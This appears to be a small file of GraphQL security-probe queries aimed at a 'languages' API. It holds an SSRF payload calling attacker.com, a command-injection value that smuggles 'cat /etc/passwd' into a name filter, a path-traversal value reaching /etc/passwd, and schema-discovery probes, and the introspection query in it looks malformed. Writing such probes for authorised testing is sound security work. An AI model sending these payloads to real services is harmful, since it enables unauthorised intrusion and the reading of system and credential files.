query.query:
# Assuming a hypothetical 'imageUrl' field or similar for demonstration if one existed.
# As there's no direct URL field, this targets potential backend interactions where 'code' or 'name' might be used.
query {
  languages(filter: {code: "http://attacker.com/ssrf_callback"}) {
    code
    name
  }
}

# Similar to SSRF, assuming 'code' or 'name' could be passed to a shell command internally.
query {
  languages(filter: {name: "English; cat /etc/passwd"}) {
    code
    name
  }
}

# Assuming 'code' or 'name' might be used in a filesystem path operation.
query {
  languages(filter: {code: "../../../etc/passwd"}) {
    code
    name
  }
}

query IntrospectionQuery {
  languages {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query FieldSuggestion {
  languages {
    cod
    nam
    nativ
  }
}
